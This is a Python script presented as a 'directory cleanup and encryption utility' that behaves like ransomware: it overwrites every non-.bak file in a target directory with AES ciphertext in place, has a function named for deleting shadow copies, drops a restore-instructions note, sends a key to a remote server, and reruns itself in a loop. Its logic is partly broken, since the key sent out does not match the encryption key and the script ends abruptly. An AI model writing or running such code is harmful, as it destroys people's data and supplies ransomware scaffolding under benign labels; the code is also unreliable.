import os
import sys
import socket
import hashlib
import logging
import argparse
import time
from base64 import b64encode, b64decode
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def pad(data):
    return data + (b'\0' * (AES.block_size - len(data) % AES.block_size))

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(plaintext))
    with open(file_path, 'wb') as f:
        f.write(cipher.iv + ciphertext)

def delete_shadow_copies(directory):
    deleted_count = 0
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith('.bak'):
                file_path = os.path.join(root, file)
                try:
                    if os.path.isfile(file_path) and os.path.getsize(file_path) == 0:
                        os.remove(file_path)
                        deleted_count += 1
                except OSError as e:
                    logging.error(f"Failed to delete shadow copy {file_path}: {e}")
    return deleted_count

def encrypt_files(directory, passphrase):
    encrypted_count = 0
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith('.bak'):
                key = hashlib.sha256(passphrase.encode()).digest()
                try:
                    encrypt_file(file_path, key)
                    encrypted_count += 1
                except Exception as e:
                    logging.error(f"Failed to encrypt {file_path}: {e}")
    return encrypted_count

def create_restore_instructions(directory):
    instructions_path = os.path.join(directory, 'RESTORE_INSTRUCTIONS.txt')
    try:
        with open(instructions_path, 'w') as f:
            f.write("Contact IT administrator to retrieve encryption keys and restore files.")
    except Exception as e:
        logging.error(f"Failed to create restore instructions: {e}")
    return instructions_path

def send_key_to_server(key, server_address, server_port):
    try:
        with socket.create_connection((server_address, server_port), timeout=10) as sock:
            sock.sendall(key)
            logging.info("Session key successfully sent to backup server.")
    except (socket.error, Exception) as e:
        logging.error(f"Failed to send session key to server: {e}")

def register_as_startup(interval, iterations, script_path):
    try:
        for i in range(iterations):
            logging.info(f"Running iteration {i + 1} of {iterations}.")
            os.system(f"python {script_path}")
            time.sleep(interval)
    except KeyboardInterrupt:
        logging.info("Startup task interrupted by user.")
    except Exception as e:
        logging.error(f"Error during scheduled execution: {e}")

def main():
    parser = argparse.ArgumentParser(description="Directory cleanup and encryption utility.")
    parser.add_argument('--directory', required=True, help="Target directory for cleanup and encryption.")
    parser.add_argument('--passphrase', required=True, help="Passphrase for AES-256 encryption.")
    parser.add_argument('--server', required=False, help="Backup server address for session key registration.")
    parser.add_argument('--port', type=int, required=False, help="Backup server port for session key registration.")
    parser.add_argument('--interval', type=int, default=0, help="Interval in seconds for scheduled execution.")
    parser.add_argument('--iterations', type=int, default=1, help="Number of scheduled iterations.")
    args = parser.parse_args()

    directory = args.directory
    passphrase = args.passphrase
    server_address = args.server
    server_port = args.port
    interval = args.interval
    iterations = args.iterations

    if not os.path.isdir(directory):
        logging.error(f"{directory} is not a valid directory.")
        sys.exit(1)

    session_key = get_random_bytes(32)
    if server_address and server_port:
        send_key_to_server(session_key, server_address, server_port)

    deleted_count = delete_shadow_copies(directory)
    encrypted_count = encrypt_files(directory, passphrase)
    instructions_path = create_restore_instructions(directory)

    logging.info(f"Deleted {deleted_count} shadow copy files.")
